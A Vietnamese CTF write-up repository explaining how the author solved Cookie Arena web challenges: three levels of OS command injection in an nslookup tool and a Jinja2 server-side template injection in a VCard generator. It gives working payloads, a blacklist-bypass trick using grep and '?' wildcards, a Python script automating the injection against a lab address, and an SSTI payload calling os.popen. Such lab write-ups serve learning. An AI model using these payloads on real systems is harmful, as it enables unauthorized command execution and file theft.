<!-- markdownlint-disable MD033 MD041 -->
<p align="center">
<a href="https://battle.cookiearena.org/"><img alt="https://battle.cookiearena.org/" src="images/logo.png" width="100" height="100"></a>
</p>
<!-- markdownlint-enable MD033 -->

# Cookie Arena

Chào mọi người!

Ở repo này, mình sẽ viết lại những cách mà mình đã thực hiện để có thể giải được một số thử thách thuộc mảng Web trên trang [Cookie Arena](https://battle.cookiearena.org/).

Bắt đầu nào! 🔥

## NSLookup (Level 1)

> Challenge này cung cấp một công cụ tra cứu DNS (Domain Name System) đơn giản, cho phép người dùng nhập tên miền (domain) vào ô nhập liệu, và chương trình sẽ trả về kết quả của lệnh nslookup. Đây là một ví dụ cho lỗ hổng OS Command Injection, nơi đầu vào không được kiểm tra đúng cách, cho phép thực thi các lệnh hệ thống ngoài ý muốn.
>
> **Cách hoạt động**:
>
> - Người dùng nhập tên miền vào biểu mẫu (form).
> - Tên miền được xử lý và truyền vào lệnh nslookup thông qua shell_exec().
> - Kết quả được hiển thị lại trong trình duyệt.
>
> **Mục tiêu**: Khai thác lỗ hổng Command Injection để truy cập và đọc nội dung file /flag.txt trên máy chủ.
>
> **Nhiệm vụ**:
>
> - Tìm cách chèn lệnh độc hại thông qua trường nhập domain.
> - Kích hoạt thực thi lệnh tùy ý trên máy chủ để trích xuất nội dung file flag.txt.

Mô tả của thử thách cũng đã rất rõ ràng, đây là một trang web được viết bằng PHP dính lỗ hổng OS Command Injection.

![image](images/nslookup-level-1/image-1.png)

Chúng ta có thể thấy, dữ liệu đầu vào qua tham số `domain` lấy từ URL không được xử lý mà được truyền thằng vào hàm `shell_exec()`, cho phép chúng ta thực thi lệnh hệ thống tuỳ ý.

Do `domain` truyền vào phía sau lệnh `nslookup` nên chúng ta sẽ kết hợp sử dụng dấu `;` để thực thi một loạt các lệnh.

Nhập vào payload `; ls /`, chúng ta xác định được có file `flag.txt` nằm tại `/`.

![image](images/nslookup-level-1/image-2.png)

Để đọc flag, chúng ta dùng payload `; cat /flag.txt`.

![image](images/nslookup-level-1/image-3.png)

## NSLookup (Level 2)

> Challenge này cung cấp một công cụ tra cứu DNS (Domain Name System) đơn giản, cho phép người dùng nhập tên miền (domain) vào ô nhập liệu, và chương trình sẽ trả về kết quả của lệnh nslookup. Đây là một ví dụ cho lỗ hổng OS Command Injection, nơi đầu vào không được kiểm tra đúng cách, cho phép thực thi các lệnh hệ thống ngoài ý muốn.
>
> **Cách hoạt động**:
>
> Người dùng nhập tên miền vào biểu mẫu (form).
> Tên miền được xử lý và truyền vào lệnh nslookup thông qua shell_exec().
> Kết quả được hiển thị lại trong trình duyệt.
>
> **Mục tiêu**: Khai thác lỗ hổng Command Injection để truy cập và đọc nội dung file /flag.txt trên máy chủ.
>
> **Nhiệm vụ**:
>
> Tìm cách chèn lệnh độc hại thông qua trường nhập domain.
> Kích hoạt thực thi lệnh tùy ý trên máy chủ để trích xuất nội dung file flag.txt.

Đến với level 2 này, lập trình viên đã đưa giá trị của tham số `domain` vào trong cặp dấu nháy `''`.

![image](images/nslookup-level-2/image-1.png)

Như vậy, chúng ta cần phải escape khỏi cặp dấu đó mới có thể thực thi được lệnh tuỳ ý.

Chúng ta có thể sử dụng payload ngắn gọn như `';cat /f*;'` để lấy flag. Ở payload này sử dụng wildcard `*` để khớp với tất cả các ký tự, nó rất hữu ích trong những trường hợp mà chúng ta không biết tên file.

![image](images/nslookup-level-2/image-2.png)

## NSLookup (Level 3)

> Tất cả các lệnh đọc file 'cat', 'head', 'tail', 'less', 'strings', 'nl', "ls", "*", "curl", "wget" đều bị chặn và không tồn tại trên hệ thống
>
> - Flag: /flagXXXX.txt
> - Flag Format: CHH{XXX}

Ở level 3 này, tác giả đã thêm vào blacklist để làm khó chúng ta hơn. Tuy nhiên, blacklist chứa rất ít từ và ký tự nên cũng không quá khó để chúng ta bypass thành công.

![image](images/nslookup-level-3/image-1.png)

Ngoài dấu `*` đại diện cho nhiều ký tự thì chúng ta còn có dấu `?` để đại diện cho 1 ký tự. Và chúng ta sẽ kết hợp dấu `?` này với một lệnh siêu hữu ích để đọc được file, đó chính là `grep`.

Vậy, chúng ta có thể truyền payload sau vào tham số `domain` để lấy về flag.

```bash
'; grep "[a-zA-Z]" /flag?????.txt;'
```

![image](images/nslookup-level-3/image-2.png)

Ngoài ra còn có một số cách khác nữa, ví dụ như sử dụng lệnh `find` để tìm được tên file flag, sau đó mới đọc flag.

Mình có viết đoạn script Python sau.

```python
import requests
import re

URL = "http://103.97.125.56:32428/index.php"

proxy = {
    "http": "http://127.0.0.1:8080"
}

search_filename_payload = "'; find / -type f -maxdepth 1 2>/dev/null;'"
read_flag_payload = "'; grep \"[a-zA-Z]\" %s;'"


def search_filename():
    data = {
        "domain": search_filename_payload
    }

    r = requests.post(url=URL, data=data)
    filename = re.search(r"/flag\w{5}.txt", r.text).group(0)

    return filename


def read_flag(filename):
    data = {
        "domain": read_flag_payload % filename
    }

    r = requests.post(url=URL, data=data)
    flag = re.search(r"CHH{\w+}", r.text).group(0)

    print(flag)


if __name__ == "__main__":
    filename = search_filename()
    read_flag(filename)

```

## Jinja2 VCard Generator

> Trang web cho phép bạn tạo và tải về VCard miễn phí. Hãy khai thác lỗ hổng Server Side Template Injection để đọc nội dung file `/flag.txt`

Bên dưới là giao diện của trang web khi chúng ta truy cập:

![image](images/jinja2-vcard-generator/image-1.png)

Tên của thử thách cùng với phần mô tả cũng đã nói cho chúng ta biết là cần khai thác Jinja2 SSTI để lấy flag.

Bên dưới là POST request khi chúng ta nhập đầy đủ các trường thông tin và nhấn "Create".

![image](images/jinja2-vcard-generator/image-2.png)

Sau khi thử lần lượt payload `{{7*7}}` ở các trường, chúng ta sẽ xác định được tại tham số `phone` dính SSTI:

![image](images/jinja2-vcard-generator/image-3.png)

Vậy, chúng ta ta có thể truyền payload cơ bản bên dưới vào tham số `phone` để đọc thành công flag.

```text
{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}
```

![image](images/jinja2-vcard-generator/image-4.png)
